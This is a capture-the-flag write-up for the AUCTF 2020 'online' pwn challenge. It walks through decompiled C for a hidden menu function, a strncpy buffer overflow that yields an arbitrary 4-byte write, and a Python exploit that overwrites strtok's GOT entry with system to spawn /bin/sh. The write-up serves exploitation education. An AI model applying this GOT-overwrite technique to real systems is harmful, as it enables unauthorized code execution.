
## online
### Description

  > Dear Student,
  >
  > Due to COVID-19 concerns our curriculum will be moving completely to online courses... I know we haven't even started our school year yet so this may come as a shock. But I promise it won't be too bad! You can login at challenges.auctf.com 30013.
  >
  > Best, Dean of Eon Pillars
  >
  > Note: ASLR is disabled for this challenge
  >
  > Author: nadrojisk


### Attachment

[online](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/AUCTF2020/pwn/online/online)

### Analysis

#### hidden function

 `class_hacker` is not in the list, but we can input `attend Hacker` to take this class 

```c
void class_hacker(void){
  char local_200c [8196];
  
  puts("\nWelcome!");
  fgets(local_200c,0x2000,stdin);
  printf("Got %s\n",local_200c);
  test(local_200c);
  return;
}
```

```c
void test(char *param_1){
  char local_814 [2048];
  undefined4 local_14;
  undefined4 *local_10;
  
  printf("0x%x\n",&stack0xfffffffc);
  strncpy(local_814,param_1,2056);
  *local_10 = local_14;
  printf("0x%x\n",local_14);
  return;
}
```

#### buffer overflow

bof in function `test`:

`strncpy(local_814,param_1,2056);`

!> `local_814` is only 2048 bytes

so, our input will **overwrite** to `local_14` and `local_10` after 2048 bytes of any char.

#### write memory

also in function `test`:  

```c
*local_10 = local_14;
```

4 bytes of **arbitrary** memory can be overwrite, and both `local_14` and `local_10` can be assigned by buffer overflow.

#### disasbled ASLR

ASLR is still disabled and the version libc is same as [House of Madness](http://note.taqini.space/#/ctf/AUCTF-2020/?id=house-of-madness), so we can know the address of any function in libc directly.

### Soultion

#### GOT overwrite attack

we can overwrite the GOT of `strtok` to `system` 

```python
libcbase = 0xf7e19000
system = libcbase+0x0003ad80
strtok_got = 0x5655904c

offset = 2048
payload = 'A'*offset
payload += p32(system)
payload += p32(strtok_got)

sla('\tName: ','TaQini')
sla('> [? for menu]: ','attend Hacker')
# debug('b *0x56556591')
sla('Welcome!\n',payload)
```

#### WHY strtok?

after `class_hacker` , we will back to the menu to input next **cmd string**

`strtok` called in `cmd_dispatch` shared the first args what we input in **cmd string**

so we can trigger `system("/bin/sh")` by input `"/bin/sh"` as **cmd string**

```python
# strtok(cmd) -> system(cmd)
sla('> [? for menu]: ','/bin/sh')
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/AUCTF2020/pwn/online) 

